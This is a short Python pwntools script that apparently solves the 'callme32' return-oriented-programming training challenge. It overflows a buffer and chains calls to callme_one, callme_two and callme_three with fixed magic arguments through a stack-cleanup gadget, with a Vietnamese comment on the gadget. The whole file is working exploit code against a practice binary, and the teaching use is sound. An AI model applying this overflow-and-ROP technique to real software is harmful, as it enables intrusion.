from pwn import *

exe = ELF("./callme32", checksec=False)
p = process(exe.path)

arg1 = 0xdeadbeef
arg2 = 0xcafebabe
arg3 = 0xd00df00d

gadget = 0x080487f9

payload = b'A' * 44
payload += p32(exe.symbols['callme_one'])
payload += p32(gadget) #tieu huy 3 gia tri arg123
payload += p32(arg1)
payload += p32(arg2)
payload += p32(arg3)

payload += p32(exe.symbols['callme_two'])
payload += p32(gadget)
payload += p32(arg1)
payload += p32(arg2)
payload += p32(arg3)

payload += p32(exe.symbols['callme_three'])
payload += p32(gadget)
payload += p32(arg1)
payload += p32(arg2)
payload += p32(arg3)

p.sendlineafter('>', payload)

output = p.recvall().decode(errors="ignore")
print(output)